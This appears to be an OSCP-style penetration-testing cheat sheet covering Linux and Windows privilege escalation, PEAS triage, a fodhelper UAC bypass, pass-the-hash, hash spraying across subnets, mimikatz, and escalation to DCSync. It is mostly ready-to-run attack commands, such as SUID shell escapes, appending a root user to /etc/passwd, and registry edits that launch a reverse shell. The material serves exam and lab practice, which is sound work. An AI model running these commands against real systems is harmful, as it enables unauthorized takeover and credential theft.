Privilege escalation

manual — think it through
# Linux enum
id ; sudo -l                              # who am I + what can I run as root
find / -perm -4000 -type f 2>/dev/null    # SUID
getcap -r / 2>/dev/null ; cat /etc/crontab

enum result → attack — most OSCP Linux roots live in sudo -l or SUID. Check every binary at gtfobins.github.io.

You findAttack → root
sudo -l entryGTFOBins the exact binary. Classics: sudo vim -c ':!/bin/sh' · sudo find . -exec /bin/sh \; -quit · sudo less /etc/profile→!/bin/sh · env: sudo LD_PRELOAD=/tmp/x.so cmd
SUID binary (non-standard)GTFOBins "SUID" section → e.g. ./find . -exec /bin/sh -p \; -quit (note -p) · cp/nano/base64 to read-or-write any file
Capability cap_setuidgetcap shows it → GTFOBins, e.g. python: os.setuid(0);os.system("/bin/sh")
Root cron / writable scriptpspy64 (watch 90s) → overwrite the script, or $PATH hijack if it calls a relative binary
Writable /etc/passwdadd root: echo 'r:$1$x$:0:0::/root:/bin/bash' >>/etc/passwd (openssl passwd -1)
Creds in files / historygrep -riE 'pass|pwd' /var/www /opt /home 2>/dev/null · ~/.bash_history → su / ssh reuse
Group: docker / lxd / diskGTFOBins group escape, e.g. docker: docker run -v /:/mnt -it alpine chroot /mnt sh

Gotchas: SUID shell needs -p (else it drops privs). Stuck? Re-run as the new user. Kernel exploits (DirtyPipe/Cow) = last resort — config/creds/SUID first.

# Windows
whoami /priv   # read the NAMES, not Enabled/Disabled

whoami /priv → token attack (service accts = IIS/MSSQL/LocalService usually have SeImpersonate). Tools in serve/windows/:

PrivilegeAttack → SYSTEM / hashes
SeImpersonate

Gotchas: "Disabled" is fine — the tool enables it. PrintSpoofer fails on 2019+/Win11 → GodPotato. Match -NET4/-NET2 to installed .NET. AV eats the exe → rename / use kit build.

PEAS triage — reading the output

no AI needed

⚡ FIRST, before reading anything: am I already admin? On any Windows foothold run whoami /groups. If you see Administrators + Medium Mandatory Level (winPEAS: user in Administrators but HighIntegrity: False) → it's a UAC bypass, NOT a privesc hunt. Skip the whole service/DLL/token scroll.

whoami /groups | findstr /i "High Mandatory"   # High = done; Medium = UAC bypass
# fodhelper UAC bypass (no binary drop, no Metasploit):
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /d "cmd.exe /c C:\Windows\Temp\rev.exe" /f
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /d "" /f
start fodhelper.exe   # catch HIGH-integrity shell; then: reg delete "HKCU\Software\Classes\ms-settings" /f

Note: a filtered medium-integrity admin token has no SeImpersonate — Potato attacks won't run until you've bypassed UAC. That's expected, not a dead end.

Overwhelmed? Open docs/Triage.html (offline, exam-legal), paste the raw PEAS dump, read the top-ranked findings. It's just a highlighter — allowed.

Read by color, pass one: 🟥 RED+YELLOW highlight = ~95% exploitable → act first. Red alone = worth a look. Green/white = skip until stuck.

./linpeas.sh -e 2>/dev/null | tee lp.txt   # then: less -R lp.txt
winPEASx64.exe systeminfo userinfo servicesinfo filesinfo  # scope it, less noise
grep -iE 'password|cpassword|secret|PWD' lp.txt

Found nothing? The 3 reflexes:

  1. Re-run PEAS as every new user you become — different user, different findings.
  2. Re-check sudo -l after every credential you discover.
  3. Work the manual list PEAS under-weights (below) — PEAS is a lead generator, not a solver.
# Linux manual sweep
sudo -l                                 # EVERY entry -> GTFOBins
find / -perm -4000 -type f 2>/dev/null  # SUID -> GTFOBins
getcap -r / 2>/dev/null                 # cap_setuid=ep = instant root
./pspy64                                # WATCH 90s: cron PEAS can't see statically
cat /etc/crontab ; ls -la /opt /home/* /var/www  # writable scripts / creds
# Windows manual sweep
whoami /priv   # SeImpersonate -> PrintSpoofer / GodPotato
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
cmdkey /list ; dir /s *.config *.xml *.kdbx  # stored creds

Password reuse is huge: try every credential for su, SSH, WinRM, and other boxes.

./scripts/bloodhound.sh start   # UI :8080 ; drag .zip ; shortest path to DA

Pass-the-Hash — the NT hash IS the password; pass -H <NThash> anywhere you'd type one. Tool depends on the OPEN port:

PortTool (PtH) — try WinRM → wmiexec → psexec
5985 WinRMevil-winrm -i IP -u Administrator -H <hash> — cleanest, interactive PS
445 SMBimpacket-wmiexec -hashes :<hash> Administrator@IP — quiet · impacket-psexec → SYSTEM but loud
3389 RDPxfreerdp /u:Administrator /pth:<hash> /v:IP — GUI (Restricted Admin)
135 DCOMimpacket-dcomexec — fallback

Spray the hash (one local-admin hash often unlocks many boxes — (Pwn3d!) = admin there):

nxc smb 172.16.0.0/24 -u Administrator -H <hash> --local-auth  # local admin spray
nxc smb 172.16.0.0/24 -u jdoe -H <hash> -d corp.local         # domain acct
# on-host, become another user in place:
mimikatz: sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<hash> /run:powershell

Gotchas: use the RID-500 Administrator hash — non-500 local admins are PtH-blocked unless LocalAccountTokenFilterPolicy=1. Local hash → --local-auth; domain → -d. Pass NT only: -H <32hex> / -hashes :<32hex>. Always grab SYSTEM hive with SAM/ntds.

Cascade: loot hash → nxc spray → own (Pwn3d!) hosts → loot their LSASS/SAM → repeat → DA hash → DCSync the DC.

When stuck — 3-min reset

  1. Re-read NOTES.md top findings — did you enum every port/service?
  2. UDP? nmap -sU --top-ports 50 IP
  3. Creds reuse across boxes / services?
  4. Web: every vhost, every dir, page source/comments, default creds?
  5. Privesc: re-run PEAS as the new user; re-check sudo -l.
